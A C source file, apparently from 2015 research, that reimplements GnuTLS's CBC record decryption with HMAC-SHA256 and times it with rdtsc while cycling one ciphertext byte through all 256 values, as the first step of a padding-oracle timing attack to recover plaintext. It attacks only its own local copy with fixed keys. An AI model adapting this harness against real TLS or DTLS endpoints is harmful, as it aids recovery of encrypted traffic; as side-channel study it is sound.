/*
 * This part of Gnutls for Encryption and Decryption
 * DTLS,aiming to working with Cacah-Attack.
 *
 * I want to recovery the plaintext by using some
 * vulnerabilities,that is,I will carry out a Padding
 * Oracle Attack.
 *
 * Author: Yves Tang
 * Dtae  : Mar.26.2015
 * E-mail: tangye@hotmail.com
 *
 */

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#include <stdio.h>
#include <stdlib.h>

#define debug 0

#if defined(_WIN32)//

int main()
{
	exit(77);
}
#else

#include "gnutls_attack.h"

static int encrypt(cipher_st* cipher_vector)
{
	gnutls_cipher_hd_t hd;
	gnutls_datum_t key, iv;
	int ret = 0;

    /*Set the key for encryption*/
	key.size = cipher_vector->key_size;
	key.data = (uint8_t*)malloc(key.size);
    memcpy(key.data, cipher_vector->key, cipher_vector->key_size);

    /*Set the iv for encryption*/
	iv.size = cipher_vector->iv_size;
    iv.data = (uint8_t*)malloc(iv.size);
	memcpy(iv.data, cipher_vector->iv, cipher_vector->iv_size);

	gnutls_cipher_init(&hd, cipher_vector->cipher, &key, &iv);

	gnutls_cipher_encrypt2(hd, cipher_vector->plaintext,
	cipher_vector->plaintext_size, cipher_vector->ciphertext,
	cipher_vector->ciphertext_size);
	gnutls_cipher_deinit(hd);

	return ret;
}

static uint8_t* read_plaintext(int* length, char* file_name)
{
	size_t file_size;
	uint8_t* in_buffer;

	FILE *in_file=fopen(file_name,"r");
	// obtain file size:
	fseek (in_file , 0 , SEEK_END);
	file_size = ftell (in_file);
	rewind (in_file);

	*length = file_size - 1;
    //allocate necessary memory
    in_buffer = (uint8_t*)malloc(*length);
    memset(in_buffer,0x00,*length);
	fread(in_buffer,1, *length, in_file);
	/*if(DEBUG)
	{
		printf("Read File Success£¡");
	}*/
	fclose(in_file);

	return in_buffer;
}

static void set_header(uint8_t* buffer)
{
    int i;
    for(i = 0; i < TLS_HANDSHAKE_HEADER_LENGTH; i++)
    {
        buffer[i] = '\xFF';
    }
}

static int set_plaintext(uint8_t* buffer)
{
    int ret;
	char* file_name = "./plaintext";
	uint8_t* plaintext;
	plaintext = read_plaintext(&ret, file_name);

	if(debug)
	{
        printf("plaintext is: \n");
        print_string_to_hex(plaintext,0,ret);
	}
    memcpy(buffer + TLS_HANDSHAKE_HEADER_LENGTH, plaintext, ret);

    return ret;
}

static int calculate_MAC(mac_st* mac_vector)
{
    int ret;
    gnutls_hmac_hd_t hd;

    ret = gnutls_hmac_init(&hd,mac_vector->mac,mac_vector->key,mac_vector->key_size);
    ret = gnutls_hmac(hd,mac_vector->plaintext,mac_vector->plaintext_size);

    gnutls_hmac_deinit(hd,mac_vector->output);

    if(debug)
    {
        printf("MAC is : \n");
        print_string_to_hex(mac_vector->output, 0, mac_vector->output_size);
        printf("MAC's Length is %d \n\n", mac_vector->output_size);
    }
    return ret;
}
/*set length for encrypt can be divided by block_size*/
static int set_padding(uint8_t* buffer,uint16_t block_size, int position)
{
    unsigned int pad;
    pad = block_size - position % block_size;

    if(debug)
    {
        printf("Pad is : %d\n\n",pad);
    }
    if(pad > 0)
    {
        memset(buffer + position,pad - 1, pad);
    }
    return position + pad;
}

static void print_string_to_hex(uint8_t* src, int from, int length)
{
    int i;
    /*for(i = length - 1; i >= from; i--)
	{
        if(*(src + i) < 16)
        {
             printf("0%X ",*(src + i));
        }else
        {
            printf("%X ",*(src + i));
        }
	}*/
	for(i = from; i < length; i++)
	{
        if(*(src + i) < 16)
        {
             printf("0%X ",*(src + i));
        }else
        {
            printf("%X ",*(src + i));
        }
	}
	printf("\n");
}


/*This function is part of Gnutls and with slight modification
*based on its arithmetic flow
*/

static void dummy_wait_t(record_parameters_st* params,
		       gnutls_datum_t* plaintext, unsigned int pad_failed,
		       unsigned int pad, unsigned int total)
{
    /* force an additional hash compression function evaluation to prevent timing
    * attacks that distinguish between wrong-mac + correct pad, from wrong-mac + incorrect pad.
    */
    unsigned int len;
    if (pad_failed == 0 && pad > 0) {
        len = _gnutls_mac_block_size(params->mac);
        if (len > 0) {
            /* This is really specific to the current hash functions.
             * It should be removed once a protocol fix is in place.
             */
            if ((pad + total) % len > len - 9
                && total % len <= len - 9) {
                if (len < plaintext->size)
                    gnutls_cipher_add_auth_t(len);
                else
                    gnutls_cipher_add_auth_t(plaintext->size);
            }
        }
    }
}

static int gnutls_cipher_add_auth_t(unsigned int len)
{
    unsigned int i;
    for(i = 0; i < len; i++)
    {
        //asm('nop');
        ;
    }
    return 0;
}

static int decrypt(cipher_st* cipher_vector, mac_st* mac_vector)
{
    uint8_t tag[MAX_HASH_LENGTH];
    //uint8_t temp_result[cipher_vector->ciphertext_size];
	const uint8_t *tag_ptr;
	unsigned int pad = 0, i;
	uint16_t block_size;
	int length;
	int ret;

	unsigned int tmp_pad_failed = 0;
	unsigned int pad_failed = 0;
	unsigned int tag_size = MAX_HASH_LENGTH;

	gnutls_cipher_hd_t cipher_hd;
    gnutls_hmac_hd_t mac_hd;

	gnutls_datum_t key, iv = {NULL, 0},temp_result;

    block_size = gnutls_cipher_get_block_size(cipher_vector->cipher);

	cipher_entry_st c;
	c.block = 1;
	mac_entry_st m;
	m.block_size = block_size;
	record_parameters_st params;
	params.cipher = &c;
	params.mac = &m;

    key.size = cipher_vector->key_size;
    key.data = (uint8_t*)malloc(key.size);
    memcpy(key.data,cipher_vector->key,cipher_vector->key_size);

    iv.size = cipher_vector->iv_size;
    iv.data = (uint8_t*)malloc(iv.size);
    memcpy(iv.data,cipher_vector->iv,cipher_vector->iv_size);

    if(debug)
    {
        printf("temp_iv is : ");
        print_string_to_hex(cipher_vector->ciphertext,
        cipher_vector->ciphertext_size - 2*block_size - 1 ,block_size);
    }
    ret = gnutls_cipher_init(&cipher_hd,cipher_vector->cipher,&key,&iv);

    if(ret < 0)
    {
        gnutls_assert_val(GNUTLS_E_DECRYPTION_FAILED);
    }

    /* we don't use the auth_cipher interface here, since
     * TLS with block ciphers is impossible to be used under such
     * an API. (the length of plaintext is required to calculate
     * auth_data, but it is not available before decryption).
     */
    temp_result.size = cipher_vector->plaintext_size;
    temp_result.data = (uint8_t*)malloc(cipher_vector->plaintext_size);
    memset(temp_result.data,'\x00',temp_result.size);
    ret =
        gnutls_cipher_decrypt2(cipher_hd,cipher_vector->ciphertext,
        cipher_vector->ciphertext_size,temp_result.data,sizeof(temp_result));

    if(debug)
    {
        printf("temp_result of plaintext is : ");
        print_string_to_hex(temp_result.data,temp_result.size - block_size - 1,block_size);
    }
    if (ret < 0)
    {
        return gnutls_assert_val(ret);
    }
    gnutls_cipher_deinit(cipher_hd);

    pad = temp_result.data[cipher_vector->ciphertext_size - 1];	/* pad */

    /* Check the pading bytes (TLS 1.x).
     * Note that we access all 256 bytes of ciphertext for padding check
     * because there is a timing channel in that memory access (in certain CPUs).
     */

    for (i = 2; i <= MIN(256, cipher_vector->ciphertext_size); i++) {
        tmp_pad_failed |=
            (temp_result.data[cipher_vector->ciphertext_size - i] != pad);
        pad_failed |=
            ((i <= (1 + pad)) & (tmp_pad_failed));
    }

    if (pad_failed != 0 || (1 + pad > ((int) cipher_vector->ciphertext_size - tag_size))) {
        /* We do not fail here. We check below for the
         * the pad_failed. If zero means success.
         */
        pad_failed = 1;
        pad = 0;
    }

    printf("pad_failed is : %d\n",pad_failed);

    /*if(!pad_failed)
    {
        printf("temp_iv is : ");
        print_string_to_hex(cipher_vector->iv,0,cipher_vector->iv_size);
    }*/

    length = cipher_vector->ciphertext_size - tag_size - pad - 1;
    tag_ptr = &temp_result.data[length];

    /* Pass the type, version, length and compressed through
     * MAC.
     */
    ret = gnutls_cipher_add_auth_t(ret);
    if (ret < 0)
        return gnutls_assert_val(ret);

    ret = gnutls_cipher_add_auth_t(ret);
    if (ret < 0)
        return gnutls_assert_val(ret);

	/*Get the tag
	*/
    ret = gnutls_hmac_init(&mac_hd,mac_vector->mac,mac_vector->key,mac_vector->key_size);
    ret = gnutls_hmac(mac_hd,temp_result.data,temp_result.size);
    gnutls_hmac_deinit(mac_hd,tag);

	if (ret < 0)
	{
        return gnutls_assert_val(ret);
	}

	/* Here there could be a timing leakage in CBC ciphersuites that
	 * could be exploited if the cost of a successful memcmp is high.
	 * A constant time memcmp would help there, but it is not easy to maintain
	 * against compiler optimizations. Currently we rely on the fact that
	 * a memcmp comparison is negligible over the crypto operations.
	 */
	if(memcmp(tag, tag_ptr, tag_size) != 0 || pad_failed != 0) {
		/* HMAC was not the same. */
		dummy_wait_t(&params,&temp_result,pad_failed,pad,length + 13);
		return gnutls_assert_val(GNUTLS_E_DECRYPTION_FAILED);
	}
	return length;
}


int main()
{
	uint8_t buffer[MAX_BUFFER_SIZE];
	cipher_st cipher;
	gnutls_cipher_algorithm_t cipher_name;
	mac_st mac;
	gnutls_mac_algorithm_t mac_name;
	uint16_t block_size;
    unsigned int length = 0;
    //uint8_t* mac_iv, cipher_iv;

    /*initial the cipher*/
    cipher_name = GNUTLS_CIPHER_AES_256_CBC;
    cipher.cipher = cipher_name;
    block_size = gnutls_cipher_get_block_size(cipher_name);
    cipher.iv_size = gnutls_cipher_get_iv_size(cipher_name);
    cipher.iv = (uint8_t*)malloc(cipher.iv_size);
    /*cipher.iv is \xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA\xFA...*/
    memset(cipher.iv,'\xFA',cipher.iv_size);
    cipher.key_size = gnutls_cipher_get_key_size(cipher_name);
    cipher.key = (uint8_t*)malloc(cipher.key_size);
    /*cipher.key is \x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F...*/
    memset(cipher.key,'\x0F',cipher.key_size);

    /*initial the mac*/
    mac_name = GNUTLS_MAC_SHA256;
    mac.key_size = gnutls_mac_get_key_size(mac_name);
    mac.key = (uint8_t*)malloc(mac.key_size);
    /*mac.key is \x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b...*/
    memset(mac.key,'\x0B',mac.key_size);
    mac.output_size = MAX_HASH_LENGTH;
    mac.output = (uint8_t*)malloc(MAX_HASH_LENGTH);
    mac.mac = mac_name;


    /*set Header*/
    set_header(buffer);
    if(debug)
    {
        printf("Header is : \n");
        print_string_to_hex(buffer, 0, TLS_HANDSHAKE_HEADER_LENGTH);
    }
    length = set_plaintext(buffer);//length of plaintext

    /*calculate the MAC value*/
    length += TLS_HANDSHAKE_HEADER_LENGTH;
    mac.plaintext_size = length;
    mac.plaintext = (uint8_t*)malloc(mac.plaintext_size);
    memcpy(mac.plaintext,buffer,length);
    calculate_MAC(&mac);

    /*Adjust*/
    length -= TLS_HANDSHAKE_HEADER_LENGTH;//the length of message
    memcpy(buffer, mac.plaintext + TLS_HANDSHAKE_HEADER_LENGTH,length);
    memcpy(buffer + length, mac.output, mac.output_size);

    /*set Padding and return the total value*/
    length += MAX_HASH_LENGTH;
    length = set_padding(buffer,block_size,length);

	/*set the plaintext for encryption and malloc space for ciphertext*/
	cipher.plaintext_size = length;
	cipher.plaintext = (uint8_t*)malloc(cipher.plaintext_size);
	memcpy(cipher.plaintext,buffer,length);
	cipher.ciphertext_size = length;
	cipher.ciphertext = (uint8_t*)malloc(cipher.ciphertext_size);
    if(debug)
    {
        printf("size of plaintext is : %d\nplaintext is : \n",length);
        print_string_to_hex(cipher.plaintext,0,cipher.plaintext_size);
    }


	/*Start Encryption*/
	encrypt(&cipher);
    if(debug)
    {
        printf("ciphertext is : \n");
        print_string_to_hex(cipher.ciphertext,0,cipher.ciphertext_size);
    }
	/*Start Decryption*/
	int i;
	uint8_t temp;
	uint64_t begin,end;

	FILE *slot_file = fopen("./slot_result","w");
	fflush(stdout);

    /*Recovery one byte*/
    uint16_t position;
    position = cipher.ciphertext_size - 2*block_size - 1;
	for(i = 0; i <= 255; i++)
	{
        temp = (uint8_t)i;
        memset(cipher.ciphertext + position,'\x00',cipher.iv_size);
        cipher.ciphertext[cipher.ciphertext_size - block_size - 1] = temp;
        rdtsc(&begin);
        decrypt(&cipher,&mac);
        rdtsc(&end);
        fprintf(slot_file,"%llu\r\n",end - begin);
        fflush(stdout);
	}

    //temp = 0x92(192) pad is correct and we will decryt the last blokc firstly
    fclose(slot_file);
	return 0;
}

static void rdtsc(uint64_t* result)
{
    asm(
        "rdtsc\n\t"
        :"=A"(*result)
    );
}



#endif				/* _WIN32 */
